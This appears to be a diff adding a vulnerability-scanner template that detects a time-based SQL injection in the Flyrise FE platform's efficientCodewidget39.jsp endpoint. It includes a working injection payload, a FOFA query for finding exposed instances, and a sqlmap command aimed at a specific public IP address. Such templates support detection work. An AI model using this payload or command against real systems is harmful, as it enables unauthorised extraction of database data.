@@ -1,0 +1,35 @@
+id: flyrise-efficientCodewidget39-sqli
+info:
+  name: 飞企互联 FE 企业运营管理平台 efficientCodewidget39.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 飞企互联-FE企业运营管理平台接口/common/efficientCodewidget39.jsp 存在SQL注入漏洞，可获取数据库数据。
+  reference: 
+    - https://github.com/wy876/POC/blob/33aeb58103048c9c34340cd4ddef97c9a853f798/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-FE%E4%BC%81%E4%B8%9A%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0_efficientCodewidget39%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="飞企互联-FE企业运营管理平台"
+    sqlmap: sqlmap -u "http://115.239.162.190:9090/common/efficientCodewidget39.jsp;.js?code=*" --batch --risk 3 --level 5  --random-agent
+  tags: flyrise,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /common/efficientCodewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:6%27--+ HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=D92D72E197627037F9556C5625B4EFFA
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
